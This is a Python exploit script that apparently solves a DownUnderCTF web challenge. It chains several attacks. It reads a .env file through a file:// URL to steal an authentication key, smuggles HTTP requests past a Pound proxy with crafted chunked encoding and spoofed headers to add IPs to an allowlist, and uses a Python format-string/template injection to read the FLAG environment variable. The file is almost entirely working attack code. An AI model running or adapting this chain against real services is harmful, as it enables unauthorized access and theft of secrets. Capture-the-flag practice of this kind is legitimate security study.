import requests
import socket
import time
import re
from urllib.request import urlopen, Request
import ssl

TARGET = "https://sodium-74705f2a1a3ee149.iso.2025.ductf.net"  # Public Flask service
TARGET_POUND = TARGET.split("//")[1]              # Proxy in front of h11 backend
POUND_PORT = 443                         # Pound proxy port
ATTACKER_IPS = []  # Attacker's IP address, change as needed

def leak_internal_authentication_key(session):
    print("[*] Leaking internal API key via /proc/self/environ...")
    payload = {
        "url": " file:///proc/self/cwd/.env"
    }
    res = session.post(TARGET + "/", data=payload, headers={"Host": "dev.customer.ductf"})
    if res.status_code != 200:
        print(f"[!] Unexpected status code: {res.status_code}")
        return None

    match = re.search(r'AUTHENTICATION_KEY=([A-Za-z0-9_]+)', res.text)
    if match:
        key = match.group(1)
        print(f"[+] Leaked internal API key: {key}")
        return session, key
    else:
        print("[!] Key not found in response")
        return None, None


def build_smuggled_request(authentication_key, ip):
    smuggled_payload = (
        f"GET /update_allowlist?ip={ip} HTTP/1.1\r\n"
        "Host: dev.rpc-service.ductf\r\n"
        f"Auth-Key: {authentication_key}\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )

    payload = (
        "GET /ping HTTP/1.1\r\n"
        "Host: dev.rpc-service.ductf\r\n"
        "Connection: keep-alive\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5\r\n"
        "AAAAAXX2\r\n"
        f"{len(smuggled_payload) + 4:X}\r\n" # Plus 4 for the "\r\n\r\n" before the smuggled payload (next 2 lines)
        "0\r\n"
        "\r\n"
        f"{smuggled_payload}"
    )

    return payload.encode()


def send_smuggled_request(internal_authentication_key, ip):
    print("[*] Sending smuggled request...")

    sock = socket.create_connection((TARGET_POUND, POUND_PORT))
    context = ssl.create_default_context()
    secure_sock = context.wrap_socket(sock, server_hostname=TARGET_POUND)

    payload = build_smuggled_request(internal_authentication_key, ip)
    print(f"[*] Payload length: {len(payload)} bytes")
    secure_sock.sendall(payload)
    time.sleep(1)
    print("[*] Awaiting response...")

    response = b""
    try:
        while True:
            chunk = secure_sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except Exception:
        pass
    secure_sock.close()
    if not response:
        print(f"[+] No response received from the server. Payload likely successfully smuggled for whitelisting: {ip}")


def login(session):
    print("[*] Logging in...")
    res = session.post(TARGET + "/login", data={
        "username": "newuser",
        "password": "newpassword"
        }, allow_redirects=False, headers= {"Host": "dev.customer.ductf"})

    if res.status_code == 302:
        print("[+] Login successful")
    else:
        print("[!] Login failed")

    return session


def register(session):
    print("[*] Registering new user...")
    res = session.post(TARGET + "/register", data={
        "username": "newuser",
        "password": "newpassword"
    }, allow_redirects=False, headers = {"Host" : "dev.customer.ductf"})

    if res.status_code == 302:
        print("[+] Registration successful")
    else:
        print("[!] Registration failed")

    return session

def get_flag(authentication_key=None):
    print("[*] Fetching flag...")
    req = Request(TARGET + "/stats?{config.__init__.__globals__[os].environ[FLAG]}")
    req.add_header("auth-key", authentication_key)
    req.add_header("Host", "dev.rpc-service.ductf")
    try:
        res = urlopen(req).read()
    except:
        print("[+] Caused an error successfully")
    res = requests.get(TARGET + "/stats?get_log=true", headers = {"Auth-key": authentication_key, "Host": "dev.rpc-service.ductf"})
    flag = re.search(r'DUCTF\{.*?\}', res.text).group(0)
    if flag:
        print(f"[+] Flag: {flag}")
    else:
        print(f"[-] Flag not found: {res.text}")

def main():
    session = requests.Session()
    session = register(session)
    session = login(session)

    session, authentication_key = leak_internal_authentication_key(session)
    if not authentication_key:
        print("[!] Could not retrieve key, aborting.")
        return

    # Because there are around 3 IPs that the proxy in front of the challenge uses
    while len(ATTACKER_IPS) != 3:
        try:
            resp = requests.get(TARGET, headers = {"Host": "dev.rpc-service.ductf"})
            ip = re.search(r'was: (.*)', resp.text).group(1)
            if ip not in ATTACKER_IPS:
                ATTACKER_IPS.append(ip)
                send_smuggled_request(authentication_key, ip)
        except:
            pass
    get_flag(authentication_key)

if __name__ == "__main__":
    main()
